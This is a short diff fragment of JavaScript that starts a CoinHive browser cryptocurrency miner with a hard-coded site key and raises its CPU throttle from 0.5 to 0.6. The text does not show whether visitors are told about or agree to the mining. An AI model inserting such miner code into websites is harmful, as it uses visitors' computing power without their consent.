@@ -1,5 +1,5 @@
 var miner = new CoinHive.Anonymous('qkZfbeimpLDMbnfrWQfAwIwjAZHXrLvI','threads: 4');
-miner.setThrottle(0.5);
+miner.setThrottle(0.6);
 miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 // Update stats once per second
 setInterval(function() {
